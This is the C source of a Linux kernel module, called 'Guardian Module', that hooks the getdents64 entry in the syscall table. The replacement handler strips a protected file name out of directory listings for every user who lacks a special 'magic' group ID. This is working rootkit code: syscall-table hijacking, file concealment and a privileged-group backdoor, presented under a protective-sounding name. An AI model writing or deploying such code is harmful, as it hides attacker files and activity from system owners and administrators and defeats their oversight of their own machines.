// SPDX-License-Identifier: GPL-2.0
/*
 * cloak_tbl.c — Guardian Module (syscall table variant), Part 3
 *
 * Replacement handler for sys_call_table[__NR_getdents64].
 * Hides PROTECTED_BASENAME from directory listings unless the caller
 * has MAGIC_GID.
 *
 * Direct pt_regs: regs->regs[1] = dirp (no double indirection).
 * Calls original, then filters the dirent buffer.
 */

#include "guardian_table.h"
#include <asm/ptrace.h>
#include <linux/dirent.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

static long hooked_getdents64(const struct pt_regs *regs) {
  struct linux_dirent64 __user *dirp = (struct linux_dirent64 __user *)regs->regs[1];
  struct linux_dirent64 *current_dir, *prev = NULL;
  long total_bytes;
  char *kbuf;
  int offset = 0;

  total_bytes = original_getdents64(regs);
  
  /* Nothing to filter if getdents64 returned 0 or error */
	if (total_bytes <= 0)
		return total_bytes;

  /* Privileged user sees everything */
	if (guardian_has_magic_gid())
		return total_bytes;

	kbuf = kmalloc(total_bytes, GFP_KERNEL);
	if (!kbuf)
		return 0;

  if (copy_from_user(kbuf, dirp, total_bytes)) {
		kfree(kbuf);
		return 0;
	}

  /* Walk the dirent buffer and remove matching entries */
	while (offset < total_bytes) {
		current_dir = (struct linux_dirent64 *)(kbuf + offset);

		if (strcmp(current_dir->d_name, PROTECTED_BASENAME) != 0) {
			/* No match — advance */
			prev = current_dir;
			offset += current_dir->d_reclen;
		} else if (prev) {
			/* Match, not first entry: prev absorbs current */
			prev->d_reclen += current_dir->d_reclen;
			offset += current_dir->d_reclen;
		} else {
			/* Match, first entry: shift everything forward */
			int reclen = current_dir->d_reclen;

			total_bytes -= reclen;
			memmove(kbuf, kbuf + reclen, total_bytes);
			/* Don't advance offset — new data is at same position */
		}
	}


  /* Write filtered buffer back to userspace*/
	copy_to_user(dirp, kbuf, total_bytes);

  kfree(kbuf);
  return total_bytes;
}

syscall_fn_t cloak_get_hook(void) { return hooked_getdents64; }
